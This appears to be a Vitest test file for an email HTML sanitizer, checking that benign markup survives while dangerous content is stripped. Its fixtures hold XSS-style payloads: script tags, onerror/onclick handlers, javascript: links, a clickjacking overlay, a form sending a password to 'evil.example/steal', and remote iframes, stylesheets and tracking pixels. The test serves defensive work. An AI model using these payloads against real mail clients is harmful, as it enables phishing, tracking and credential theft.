// @vitest-environment jsdom
/**
 * O4-04 · sender HTML is data. Legitimate markup survives; scripts, handlers,
 * forms, remote resources and navigation do not reach the frame.
 */
import { describe, expect, it } from 'vitest'
import { sanitizeEmailHtml } from '../src/client/safe-email.ts'

/** Whether the serialized document still mentions a URL. */
function mentions(html: string, needle: string): boolean {
  return html.includes(needle)
}

describe('sanitizeEmailHtml', () => {
  it('keeps legitimate email markup and its inlined images', () => {
    const safe = sanitizeEmailHtml('<p style="color:#333">Hola <b>cliente</b></p><img src="data:image/png;base64,AAAA" alt="logo"><table><tr><td>Total</td></tr></table>')

    expect(safe).toContain('<p style="color:#333">Hola <b>cliente</b></p>')
    expect(safe).toContain('src="data:image/png;base64,AAAA"')
    expect(safe).toContain('<table>')
    expect(safe).toContain('Content-Security-Policy')
    expect(safe).toContain("default-src 'none'")
  })

  it('removes scripts, handlers, forms and controls so nothing can act', () => {
    const safe = sanitizeEmailHtml([
      '<script>alert(1)</script>',
      '<img src="data:image/png;base64,AAAA" onerror="alert(2)">',
      '<form action="https://evil.example/steal"><input name="password"><button>Aprobar</button></form>',
      '<a href="javascript:alert(3)">Aprobar envío</a>',
      '<div onclick="alert(4)" style="position:fixed;inset:0;z-index:99999">tapando</div>',
    ].join(''))

    expect(safe).not.toContain('<script')
    expect(safe).not.toContain('onerror')
    expect(safe).not.toContain('onclick')
    expect(safe).not.toContain('<form')
    expect(safe).not.toContain('<input')
    expect(safe).not.toContain('<button')
    expect(safe).not.toContain('javascript:')
    // The text stays readable; only the action is gone.
    expect(safe).toContain('Aprobar envío')
    expect(safe).toContain('tapando')
  })

  it('drops remote resources and documents that could replace the frame', () => {
    const safe = sanitizeEmailHtml([
      '<base href="https://evil.example/">',
      '<link rel="stylesheet" href="https://evil.example/x.css">',
      '<img src="https://tracker.example/pixel.png" srcset="https://tracker.example/2x.png 2x">',
      '<iframe src="https://evil.example/frame"></iframe>',
      '<object data="https://evil.example/x.swf"></object>',
      '<video src="https://evil.example/x.mp4" poster="https://evil.example/p.jpg"></video>',
      '<a href="https://evil.example/">Ver pedido</a>',
    ].join(''))

    expect(safe).not.toContain('https://tracker.example')
    expect(safe).not.toContain('https://evil.example')
    expect(safe).not.toContain('<base')
    expect(safe).not.toContain('<link')
    expect(safe).not.toContain('<iframe')
    expect(safe).not.toContain('<object')
    expect(safe).not.toContain('<video')
    expect(mentions(safe, 'srcset')).toBe(false)
    expect(safe).toContain('Ver pedido')
  })

  it('keeps in-page anchors and strips their destination otherwise', () => {
    const safe = sanitizeEmailHtml('<a href="#detalle">Detalle</a><a href="https://evil.example">Fuera</a>')
    expect(safe).toContain('href="#detalle"')
    expect(safe).not.toContain('https://evil.example')
  })
})
